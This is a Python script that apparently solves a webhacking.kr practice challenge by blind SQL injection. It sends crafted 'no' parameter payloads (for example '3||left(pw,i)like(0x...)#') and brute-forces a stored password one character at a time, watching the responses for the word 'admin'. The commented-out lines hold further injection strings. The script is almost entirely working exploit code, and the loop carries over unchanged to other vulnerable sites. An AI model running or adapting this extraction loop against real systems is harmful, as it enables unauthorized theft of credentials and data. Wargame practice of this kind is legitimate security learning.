import requests
import string

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

URL = "https://webhacking.kr/challenge/web-29/"
SESSION_ID = "1"
cookies = {'PHPSESSID':SESSION_ID}
params ={'no':'2', 'id':'guest','pw':'guest'}
data = {'pw':'123'}

# find no.
# 3%26%26left(pw,4)like(0x6C75636B)%23&id=guest&pw=guest

pw = "luck"
i = len(pw)+1
while True:
    for c in string.printable:

        # params['no'] = f'1||((left(id,1)like(0x67))%26%26(left(pw,{i})like(0x{string_to_hex(id+c)})))%23'
        hex = string_to_hex((pw+c).replace("_", r"\_").replace('.',r'\.').replace('%',r'\%'))
        params['no'] = f'3||left(pw,{i})like(0x{hex})#'
        # print(params['no'])
        response = requests.get(URL, params=params, cookies=cookies)
        print(c)
        # print(response.text)
        if "admin" in response.text:
            if "guest".startswith(pw+c):
                continue
            pw += c
            i += 1
            print(pw)
            break
